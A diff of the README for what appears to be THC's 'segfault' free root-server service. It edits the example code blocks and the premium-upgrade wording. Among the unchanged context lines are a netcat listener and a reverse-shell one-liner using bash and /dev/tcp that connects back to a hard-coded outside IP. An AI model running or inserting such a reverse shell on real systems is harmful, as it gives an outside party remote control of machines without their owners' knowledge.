@@ -58,11 +58,7 @@ ssh blah@anotherserver.com
 ```shell
 # Share files anonymously:
 echo "My First File Shared on The Onion Router (TOR) network" >/onion/helloworld.txt
-```
 
-or:
-
-```shell
 # Or publish a full webpage (using Markdown syntax):
 # Edit your webpage in /sec/www/content/*.md and then publish them:
 cd /sec/www && make html
@@ -102,11 +98,7 @@ curl -x socks5h://0 http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqx
 ```shell
 # On your server:
 nc -vnlp 34868 # Find your IP & PORT during first log in.
-```
 
-or:
-
-```shell
 # On another server start a connect back reverse shell to your IP & PORT:
 setsid bash -i &>/dev/tcp/185.117.118.23/34868 0>&1 &
 ```
@@ -115,9 +107,7 @@ setsid bash -i &>/dev/tcp/185.117.118.23/34868 0>&1 &
 
 Read the [FAQ](faq) and join us on [Telegram](https://t.me/thcorg) or read the source on [GitHub](https://github.com/hackerschoice/segfault).
 
-This is a **free service** and there are [some restrictions](youcheapfuck) in place. You may want to [pay for an upgrade and go unrestricted](buy-an-upgrade).
-
-The **PREMIUM** service has no restriction. Go premium by donating money or contact us - we give premium access to most users who work on a cool project or users who participate in our discussions.
+This is a **free service** and there are [some restrictions](youcheapfuck) in place. You may want to [level up and go unrestricted](buy-an-upgrade).
 
 ## Similar Services
 
